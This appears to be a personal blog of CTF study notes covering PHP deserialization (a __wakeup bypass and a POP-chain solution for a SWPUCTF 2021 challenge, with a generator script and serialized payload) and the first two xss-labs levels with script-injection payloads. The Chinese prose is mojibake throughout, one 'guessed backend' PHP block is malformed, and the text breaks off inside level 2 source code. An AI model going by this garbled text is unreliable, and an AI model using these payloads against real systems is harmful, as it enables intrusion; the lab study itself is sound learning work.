<p><strong>ç»•è¿‡åŸç†</strong><br>ç”±äºä¿®æ”¹äº†å±æ€§ä¸ªæ•°ï¼ŒPHPåœ¨ååºåˆ—åŒ–æ—¶ä¼šè·³è¿‡__wakeup()æ–¹æ³•çš„æ‰§è¡Œã€‚å› æ­¤ï¼Œpasswdå±æ€§çš„å€¼ä¸ä¼šè¢«SHA-1å“ˆå¸Œå¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥ä¿ç•™ä¸ºwllmã€‚å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œ__destruct()æ–¹æ³•ä¼šæ£€æŸ¥adminå’Œpasswdçš„å€¼ï¼Œå‘ç°å®ƒä»¬æ»¡è¶³æ¡ä»¶ï¼Œä»è€ŒåŒ…å«flag.phpå¹¶è¾“å‡ºflagã€‚<br>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ”»å‡»è€…æˆåŠŸç»•è¿‡äº†__wakeup()æ–¹æ³•ï¼Œç›´æ¥è®¾ç½®äº†æ‰€éœ€çš„å±æ€§å€¼ï¼Œè§¦å‘äº†æ•æ„Ÿæ–‡ä»¶çš„åŒ…å«ã€‚</p>
<p>æˆ‘çš„ç†è§£å°±æ˜¯ï¼š<br>æ„é€ ä¸€ä¸ªè¢«javaåºåˆ—åŒ–åçš„æ•°å€¼æ¥æ»¡è¶³æ¡ä»¶ï¼Œå¹¶ä¸”ä½¿ç”¨å®šä¹‰ä¸å®é™…çš„çš„å±æ€§ä¸ªæ•°ä¸åŒæ¥ç»•è¿‡wakeup(),å› ä¸ºwakeupæ ¹æœ¬å°±æ˜¯ä¸æƒ³è®©ä½ è¿‡çš„</p>
<p>O:6:â€HaHaHaâ€:2:{s:5:â€adminâ€;s:5:â€adminâ€;s:6:â€passwdâ€;s:10:â€wllmâ€;}<br>å…¶ä¸­sæ˜¯å­—ç¬¦ä¸²é•¿åº¦ï¼Œ2ä»£è¡¨é‡Œé¢æœ‰ä¸¤ä¸ªå…ƒç´ ï¼šadmin&#x3D;adminï¼Œpasswd&#x3D;wllmã€‚<br>å§2æ”¹æˆå…¶å®ƒè¶…è¿‡å®é™…å…ƒç´ çš„å€¼å³å¯ç»•è¿‡wakeup()<br>å°±æ˜¯è¦å¤§è¿‡2ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½å°äº2</p>
<hr>
<h2 id="title-note-ååºåˆ—åŒ–-01date-2025-03-19-18-49-19tags"><a href="#title-note-ååºåˆ—åŒ–-01date-2025-03-19-18-49-19tags" class="headerlink" title="title: note-ååºåˆ—åŒ–-01date: 2025-03-19 18:49:19tags:"></a>title: note-ååºåˆ—åŒ–-01<br>date: 2025-03-19 18:49:19<br>tags:</h2><p>popé“¾ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆ</p>
<blockquote>
<p>POPé“¾å°±æ˜¯åˆ©ç”¨é­”æ³•æ–¹æ³•åœ¨é‡Œé¢è¿›è¡Œå¤šæ¬¡è·³è½¬ç„¶åè·å–æ•æ„Ÿæ•°æ®çš„ä¸€ç§payloadï¼Œå®æˆ˜åº”ç”¨èŒƒå›´æš‚æ—¶æ²¡é‡åˆ°ï¼Œä¸è¿‡åœ¨CTFæ¯”èµ›ä¸­ç»å¸¸å‡ºç°è¿™æ ·çš„é¢˜ç›®ï¼ŒåŒæ—¶ä¹Ÿç»å¸¸ä¸ååºåˆ—åŒ–ä¸€èµ·è€ƒå¯Ÿï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ååºåˆ—åŒ–çš„ä¸€ç§æ‹“å±•ï¼Œæ³›ç”¨æ€§æ›´å¼ºï¼Œæ¶‰åŠåˆ°çš„é­”æ³•æ–¹æ³•ä¹Ÿæ›´å¤šã€‚  </p>
</blockquote>
<h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-pop-1"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-pop-1" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]pop</h1><p>æˆ‘æƒ³tagå¯ä»¥æœ‰ï¼špopé“¾ï¼Œååºåˆ—åŒ–<br>åŸé¢˜ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br></code></pre></td></tr></table></figure>

<p>å­¦äº†å¤§ä½¬çš„wp <a target="_blank" rel="noopener" href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a><br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>çœ‹å®Œååº”è¯¥æ˜¯å› ä¸ºåªèƒ½ä¼ w00mçš„å€¼ï¼Œè€Œw44mä¸­æ— æ³•ç›´æ¥ä¼ å…¥ï¼Œè¦é€šè¿‡ä¸€åœºä¸²ç›¸äº’å…³è”çš„ç±»æ‰èƒ½ä¼ å…¥ï¼Œè¿™å¤§æ¦‚å°±æ˜¯popé“¾å§  </p>
<p>å…ˆæ˜¯ w22m å’Œ w33m éƒ½èƒ½ä¼ å…¥w00mï¼Œ</p>
<blockquote>
<p>$this-&gt;w00m-&gt;{$this-&gt;w22m}(); æœ€ç»ˆçš„æ•ˆæœæ˜¯åŠ¨æ€è°ƒç”¨ $this-&gt;w00m å¯¹è±¡ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæ–¹æ³•çš„åç§°ç”± $this-&gt;w22m å†³å®šã€‚è€Œ è¿™æ¡è¯­å¥çš„æ„æ€å°±æ˜¯è°ƒç”¨äº†åœ¨w33mé‡Œçš„w00må±æ€§ï¼ˆè¿™é‡Œæ˜¯w00mç±»ï¼‰ä¸­çš„w22mæ–¹æ³•ã€‚</p>
</blockquote>
<h2 id="ä¸ºä»€ä¹ˆå…ˆèµ‹å€¼-w22m"><a href="#ä¸ºä»€ä¹ˆå…ˆèµ‹å€¼-w22m" class="headerlink" title="ä¸ºä»€ä¹ˆå…ˆèµ‹å€¼ w22m  "></a><strong>ä¸ºä»€ä¹ˆå…ˆèµ‹å€¼ w22m</strong>  </h2><p><strong>åˆ©ç”¨ w22m çš„ __destruct æ–¹æ³•ï¼š</strong><br>w22m ç±»çš„ __destruct æ–¹æ³•ä¼šè¾“å‡º $this-&gt;w00mã€‚<br>å½“ PHP è„šæœ¬ç»“æŸæ—¶ï¼Œæˆ–è€…å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œ__destruct æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚<br>è¿™æ„å‘³ç€ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–ä¸€ä¸ª w22m å¯¹è±¡æ—¶ï¼Œ__destruct æ–¹æ³•ä¼šç«‹å³æ‰§è¡Œï¼Œä»è€Œè§¦å‘åç»­çš„æ“ä½œã€‚  </p>
<p><strong>è§¦å‘ w33m çš„ __toString æ–¹æ³•ï¼š</strong><br>w22m çš„ __destruct æ–¹æ³•è¾“å‡º $this-&gt;w00mï¼Œè€Œ $this-&gt;w00m æ˜¯ä¸€ä¸ª w33m å¯¹è±¡ã€‚<br>å½“ PHP éœ€è¦å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼ˆä¾‹å¦‚åœ¨ echo ä¸­ï¼‰ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„ __toString æ–¹æ³•ã€‚<br>å› æ­¤ï¼Œw33m çš„ __toString æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚    </p>
<p><strong>è°ƒç”¨ w44m çš„ Getflag æ–¹æ³•ï¼š</strong><br>w33m çš„ __toString æ–¹æ³•ä¸­ï¼Œ$this-&gt;w00m-&gt;{$this-&gt;w22m}() ä¼šè¢«æ‰§è¡Œã€‚<br>è¿™é‡Œçš„ $this-&gt;w00m æ˜¯ä¸€ä¸ª w44m å¯¹è±¡ï¼Œè€Œ $this-&gt;w22m æ˜¯å­—ç¬¦ä¸² â€˜Getflagâ€™ã€‚<br>å› æ­¤ï¼Œw44m çš„ Getflag æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚  </p>
<h2 id="æˆ‘çš„ç†è§£æ˜¯ï¼šæ•´ä¸ªæ„é€ çš„æœ€ç»ˆç›®çš„æ˜¯ä¸ºäº†æ‰§è¡Œ-w44m-ç±»ä¸­çš„-Getflag-æ–¹æ³•"><a href="#æˆ‘çš„ç†è§£æ˜¯ï¼šæ•´ä¸ªæ„é€ çš„æœ€ç»ˆç›®çš„æ˜¯ä¸ºäº†æ‰§è¡Œ-w44m-ç±»ä¸­çš„-Getflag-æ–¹æ³•" class="headerlink" title="æˆ‘çš„ç†è§£æ˜¯ï¼šæ•´ä¸ªæ„é€ çš„æœ€ç»ˆç›®çš„æ˜¯ä¸ºäº†æ‰§è¡Œ w44m ç±»ä¸­çš„ Getflag æ–¹æ³•  "></a>æˆ‘çš„ç†è§£æ˜¯ï¼šæ•´ä¸ªæ„é€ çš„æœ€ç»ˆç›®çš„æ˜¯ä¸ºäº†æ‰§è¡Œ w44m ç±»ä¸­çš„ Getflag æ–¹æ³•  </h2><blockquote>
<p>å¯¹äº__toString()ï¼Œè¦æ±‚æ˜¯åœ¨å®ƒç±»é‡Œçš„å˜é‡è¢«å®ä¾‹åŒ–æ—¶æ‰ä¼šè¢«è§¦å‘ã€‚æ‰€ä»¥$p-&gt;w00m &#x3D; new w33m();åˆ™ä¸ä¼šè§¦å‘__toString()ã€‚è€Œåé¢$a-&gt;w00m-&gt;w00m&#x3D;new w44m();è¯­å¥ä¸ºw33mç±»ä¸­çš„å˜é‡å®ä¾‹åŒ–åï¼Œæ‰èƒ½ä½¿_toString()æ–¹æ³•å¯è¢«è°ƒç”¨ï¼Œè¿›ä¸€æ­¥è®©$a-&gt;w00m-&gt;w22m&#x3D;â€™Getflagâ€™;è¯­å¥ç”Ÿæ•ˆã€‚</p>
</blockquote>
<blockquote>
<p>å½“æˆ‘ä»¬ä¼ é€’çš„å‚æ•°ä¸­å«æœ‰privateå˜é‡æ—¶ï¼Œä¸€å®šè¦urlç¼–ç ä¸€ä¸‹ï¼Œå¦åˆ™ä¼šæœ‰ä¸å¯è§å­—ç¬¦å¯¼è‡´è§£æå‡ºé”™ã€‚</p>
</blockquote>
<p>è¿™æ˜¯æˆ‘çŒœæµ‹åç«¯ä»£ç æ¥æ”¶åˆ°ä¼ å…¥åçš„æ ·å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> (w00m)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> (<span class="hljs-title">w00m</span>)<span class="hljs-title">w44m</span></span>&#123;<br><br>            <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>            <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>        <br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        <span class="hljs-keyword">public</span> (w22m)<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
<p><br><br><br>\</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>&#123;$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>w22m&#125;();<br></code></pre></td></tr></table></figure>
<p>q:  </p>
<blockquote>
<p>çš„æ„æ€æ˜¯è®©å°†w22mçš„å€¼ä½œä¸ºå‚æ•°è¾“å…¥w00må—</p>
</blockquote>
<p>kimi:</p>
<blockquote>
<p>ä¸æ˜¯çš„,ä¾‹å¦‚ï¼Œå¦‚æœ $this-&gt;w22m çš„å€¼æ˜¯ â€˜Getflagâ€™ï¼Œé‚£ä¹ˆè¿™è¡Œä»£ç å°±ç›¸å½“äº $this-&gt;w00m-&gt;Getflag()ã€‚ </p>
</blockquote>
<p>q:</p>
<blockquote>
<p>é‚£å°±æ˜¯æ‰§è¡Œw00mä¸­çš„getflag()ï¼Ÿ</p>
</blockquote>
<p>kimi:</p>
<blockquote>
<p>æ˜¯çš„ï¼Œè¿™è¡Œä»£ç çš„æ„æ€æ˜¯æ‰§è¡Œ $this-&gt;w00m å¯¹è±¡ä¸­çš„ Getflag() æ–¹æ³•</p>
</blockquote>
<h2 id="é‚£ä¹ˆæˆ‘çœ‹æ€»çš„æ„æ€æ˜¯ï¼š"><a href="#é‚£ä¹ˆæˆ‘çœ‹æ€»çš„æ„æ€æ˜¯ï¼š" class="headerlink" title="é‚£ä¹ˆæˆ‘çœ‹æ€»çš„æ„æ€æ˜¯ï¼š"></a>é‚£ä¹ˆæˆ‘çœ‹æ€»çš„æ„æ€æ˜¯ï¼š</h2><p>å°†w22mä¸­çš„w00mèµ‹å€¼ä¸ºw33mçš„ç±»<br>å†å°†w22mä¸­w00mï¼ˆç°å·²ä¸ºw33mç±»ï¼‰çš„w00mèµ‹å€¼ä¸ºw44mçš„ç±»<br>æœ€åå°†w22mä¸­çš„w00mï¼ˆç°å·²ä¸ºw33mç±»ï¼‰ä¸­çš„w22mèµ‹å€¼ä¸ºâ€˜GetFlagâ€™<br>æœ€åç”±äº__toString()å‡½æ•°ï¼Œä¼šå°†æ”¹ç±»ä¸‹çš„w22mçš„å€¼ä½œä¸ºw44mä¸­çš„çš„å…ƒç´ æ‰§è¡Œï¼Œé‚£ç»“æœå°±æ˜¯æ‰§è¡Œw44mä¸­çš„Getflag<br>è¾“å‡ºflag</p>
<p>wpä½œè€…ï¼š</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">$a=new w22m();<span class="hljs-comment">//è¿™æ®µä»£ç è¯´æ˜æˆ‘ä»¬å°†w22mç±»èµ‹å€¼ç»™aï¼Œç°åœ¨å¯ä»¥å°†$açœ‹åšw22mç±»,æ‰€ä»¥ç°åœ¨$aä¸­æœ‰ä¸€ä¸ªå±æ€§w00m</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span>w00m=new w33m();<span class="hljs-comment">//å°†w22mä¸­çš„w00må±æ€§è°ƒç”¨ï¼ˆæŒ‡å‘ï¼‰w33mç±»ï¼šç°åœ¨w22mä¸­w00må±æ€§æœ‰w33ç±»ä¸­w00må’Œw22mä¸¤ä¸ªå±æ€§ã€‚</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w00m=new w44m();<span class="hljs-comment">//w22mç±»ä¸­w00må±æ€§è°ƒç”¨äº†w44mç±»</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<span class="hljs-comment">//ä½¿ç”¨äº†w44mç±»ä¸­çš„Getflagæ–¹æ³•ï¼Œ()åœ¨w33mä¸­_toString()æ–¹æ³•è¢«è°ƒç”¨ã€‚</span><br>æœ€åçš„æ•ˆæœå°±æ˜¯åœ¨w44mä¸­æ‰§è¡Œäº†Getflag()æ•´ä¸ªæ–¹æ³•ï¼Œè¾“å‡ºäº†$flagçš„å€¼ã€‚<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a></p>
<p>æœ€åpayload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w33m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;w44madmin&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;*passwd&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;08067&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Getflag&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
<p>ä¼ å…¥è¦å‹urlç¼–ç ï¼Œ</p>
<blockquote>
<p>å½“æˆ‘ä»¬ä¼ é€’çš„å‚æ•°ä¸­å«æœ‰privateå˜é‡æ—¶ï¼Œä¸€å®šè¦urlç¼–ç ä¸€ä¸‹ï¼Œå¦åˆ™ä¼šæœ‰ä¸å¯è§å­—ç¬¦å¯¼è‡´è§£æå‡ºé”™</p>
</blockquote>
<hr>
<h2 id="title-xss-labs-studynotesdate-2025-10-01-01-59-18tags"><a href="#title-xss-labs-studynotesdate-2025-10-01-01-59-18tags" class="headerlink" title="title: xss-labs-studynotesdate: 2025-10-01 01:59:18tags:"></a>title: xss-labs-studynotes<br>date: 2025-10-01 01:59:18<br>tags:</h2><h1 id="æ‰“ä¸€ä¸‹xss-labs"><a href="#æ‰“ä¸€ä¸‹xss-labs" class="headerlink" title="æ‰“ä¸€ä¸‹xss-labs"></a>æ‰“ä¸€ä¸‹xss-labs</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>å¯ä»¥ç›´æ¥ç”¨payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>è‡ªå·±æ²¡è¯•å‡ºæ¥ï¼Œå»ç½‘ä¸Šæ‰¾payloadï¼Œå‘ç°<strong>é—­åˆå‹æ ‡ç­¾</strong>æ³¨å…¥å¯ç”¨ï¼š  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
<p>æºç ï¼š   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level3.php?writing=wait&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level2&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span 